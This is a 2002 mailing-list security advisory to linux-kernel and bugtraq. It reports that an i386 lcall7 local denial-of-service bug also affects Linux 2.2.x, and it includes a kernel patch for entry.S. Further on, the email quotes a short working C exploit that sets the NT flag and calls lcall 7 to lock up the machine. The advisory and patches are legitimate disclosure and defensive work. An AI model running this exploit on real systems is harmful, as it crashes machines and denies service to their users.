Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S267448AbSKSWIv>; Tue, 19 Nov 2002 17:08:51 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S267493AbSKSWIv>; Tue, 19 Nov 2002 17:08:51 -0500
Received: from shuzbut.anathoth.gen.nz ([203.96.153.249]:3982 "EHLO
	shuzbut.anathoth.gen.nz") by vger.kernel.org with ESMTP
	id <S267448AbSKSWIq>; Tue, 19 Nov 2002 17:08:46 -0500
Subject: [PATCH] ALERT!! - 2.2.x i386 Linux kernel has 2.4.x DoS!!!!
From: Matthew Grant <grantma@anathoth.gen.nz>
To: debian-security@lists.debian.org, linux-kernel@vger.kernel.org,
       bugtraq@lists.securityfocus.com, lwn@lwn.net, alan@redhat.com,
       Herbert Xu <herbert@debian.org>
Content-Type: multipart/signed; micalg=pgp-sha1; protocol="application/pgp-signature";
	boundary="=-IwcrYTEeZTKHkb33FSEP"
X-Mailer: Ximian Evolution 1.0.7 
Date: 20 Nov 2002 11:15:42 +1300
Message-Id: <1037744143.10198.9.camel@luther>
Mime-Version: 1.0
X-Virus-Scanned-By: Amavis with CLAM Anti Virus on shuzbut.anathoth.gen.nz
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


--=-IwcrYTEeZTKHkb33FSEP
Content-Type: text/plain
Content-Transfer-Encoding: quoted-printable

Here is the gpg signed version of the notice.  I am a Debian Developer,=20
so you will find my key  on the Debian key ring.

---------------------------------------------------------------------------=
----

ALERT ALERT ALERT!

Sorry about shouting, but no one seems to take any notice that the
kernel 2.4.x local DoS ALSO definitely affects linux kernel 2.2.x,=20
and possibly 2.0.x

I have been working on this one, and no one so far has produced any headlin=
es
about it, but 2.2.x is ALSO affected.

I have tested and found 2.2.x is vulnerable with Andrea Archangeli's exploi=
t.=20
It also has exactly the same lcall7() function in the system call interface=
=20
as 2.4.x, and is definitely vulnerable. The patch below definitely STOPS th=
e
crashes in 2.2.x.

Result of bug is as in 2.4.x, an absolute lockup of the machine. This
is an easy vulnerability for a script kiddy to turn any network accessible
buffer overflow into a DOS.

Here is the patch to fix 2.2:

--- linux/arch/i386/kernel/entry.S.orig	Sat Nov  3 05:39:05 2001
+++ linux/arch/i386/kernel/entry.S	Tue Nov 19 13:46:47 2002
@@ -63,7 +63,9 @@
 OLDSS		=3D 0x38
=20
 CF_MASK		=3D 0x00000001
+TF_MASK		=3D 0x00000100
 IF_MASK		=3D 0x00000200
+DF_MASK		=3D 0x00000400
 NT_MASK		=3D 0x00004000
 VM_MASK		=3D 0x00020000
=20
@@ -139,6 +141,9 @@
 	movl CS(%esp),%edx	# this is eip..
 	movl EFLAGS(%esp),%ecx	# and this is cs..
 	movl %eax,EFLAGS(%esp)	#
+	andl $~(NT_MASK|TF_MASK|DF_MASK), %eax
+	pushl %eax
+	popfl
 	movl %edx,EIP(%esp)	# Now we move them to their "normal" places
 	movl %ecx,CS(%esp)	#
 	movl %esp,%ebx


Best Regards,

Matthew Grant


---------------------------------------------------------------------------



Hi THere!

Fun and REAL games!

I checked the code affected in arch/i386/kernel/entry.S for 2.2.x, and
the lcall7 () call looked vulnerable as it was the same as in 2.4.x, so
that I ran the follwing exploit on 2.2.x, and the machine locked
completely....

I have not check 2.0.x, but given the staleness of this code segment, it
may also be affected.

The fix appears to be to adapt the 2.4.x patch to 2.2.x, which looks
fairly easy to do.

Best Regards,

Matthew Grant

PS: I am a debian developer...


Exploit code from lkml  Andrea Arcangeli <andrea@suse.de>

> we just can't allow userspace to set NT or iret will crash at ret from
> userspace, furthmore there's no useful thing the userspace can do with
> the NT flag.
>=20
> here the fix, it applies to all 2.4 and 2.5:
>=20
> --- 2.4.20rc1aa2/arch/i386/kernel/ptrace.c.~1~	Fri Aug  9 14:52:06
2002
> +++ 2.4.20rc1aa2/arch/i386/kernel/ptrace.c	Thu Nov 14 03:56:00 2002
> @@ -28,7 +28,7 @@
> =20
>  /* determines which flags the user has access to. */
>  /* 1 =3D access 0 =3D no access */
> -#define FLAG_MASK 0x00044dd5
> +#define FLAG_MASK 0x00040dd5
> =20
>  /* set's the trap flag. */
>  #define TRAP_FLAG 0x100

sorry, this is the wrong fix, it happened to fix the problem for the
only testcase working out there because such a testcase was written in a
way that used ptrace to set the eflags instead of a more simple
pushf popf lcall like this:

int main( void )
{
    char dos[] =3D "\x9C"                           /* pushfd       */
                 "\x58"                           /* pop eax      */
                 "\x0D\x00\x41\x00\x00"           /* or eax,4100h  */
                 "\x50"                           /* push eax     */
                 "\x9D"                           /* popfd        */
                 "\x9A\x00\x00\x00\x00\x07\x00";  /* call 07h:00h */

    void (* f)( void );

    f =3D (void *) dos; (* f)();

    return 1;
}

(note the above is differnet to the one posted on bugtraq, the above one
is a simple version of the "working" exploit posted to l-k)

I clearly misunderstood how the nt works, it is read from the in core
eflags, not from the copy on the stack, so my patch won't make any
difference as far as the kernel is concerned and the only problem was
again with lcall, so the right fix is the last one from Petr.  sorry for
the spam.

Andrea







------------- Message from linux-kernel@vger.kernel.org--------------=20


List:     linux-kernel
Subject:  Re: FW: i386 Linux kernel DoS
From:     Krzysiek Taraszka <dzimi@pld.org.pl>
Date:     2002-11-16 19:33:08

On 13 Nov 2002, Alan Cox wrote:

> On Tue, 2002-11-12 at 23:31, Christoph Hellwig wrote:
> > On Tue, Nov 12, 2002 at 02:28:55PM -0900, Leif Sawyer wrote:
> > > This was posted on bugtraq today...
> >=20
> > A real segfaulting program?  wow :)
>=20
> Looks like the TF handling bug which was fixed a while ago

It wasn't fixed for 2.2.22. 2.2 has got only syscall7, so fix should be=20
trivial, isn't ?
Should be look like:


diff -urN linux.orig/arch/i386/kernel/entry.S=20
linux/arch/i386/kernel/entry.S
--- linux.orig/arch/i386/kernel/entry.S Tue May 21 01:32:34 2002
+++ linux/arch/i386/kernel/entry.S      Thu Nov 14 21:39:36 2002
@@ -63,7 +63,9 @@
 OLDSS          =3D 0x38

 CF_MASK                =3D 0x00000001
+TF_MASK                =3D 0x00000100
 IF_MASK                =3D 0x00000200
+DF_MASK                =3D 0x00000400
 NT_MASK                =3D 0x00004000
 VM_MASK                =3D 0x00020000

@@ -139,6 +141,9 @@
        movl CS(%esp),%edx      # this is eip..
        movl EFLAGS(%esp),%ecx  # and this is cs..
        movl %eax,EFLAGS(%esp)  #
+       andl $~(NT_MASK|TF_MASK|DF_MASK), %eax
+       pushl %eax
+       popfl
        movl %edx,EIP(%esp)     # Now we move them to their "normal"
places
        movl %ecx,CS(%esp)      #
        movl %esp,%ebx


or I missing somethink ?

Krzysiek Taraszka			(dzimi@pld.org.pl)

-
To unsubscribe from this list: send the line "unsubscribe linux-kernel"
in
the body of a message to majordomo@vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
Please read the FAQ at  http://www.tux.org/lkml/




--=-IwcrYTEeZTKHkb33FSEP
Content-Type: application/pgp-signature; name=signature.asc
Content-Description: This is a digitally signed message part

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.0.6 (GNU/Linux)
Comment: For info see http://www.gnupg.org

iD8DBQA92rgOuk55Di7iAnARArEnAJoDe1VARxwaoeumxQmgfH0hADkoPgCfU94q
w0gQyLn3N/1bfgTqDTqQjrE=
=FNtp
-----END PGP SIGNATURE-----

--=-IwcrYTEeZTKHkb33FSEP--

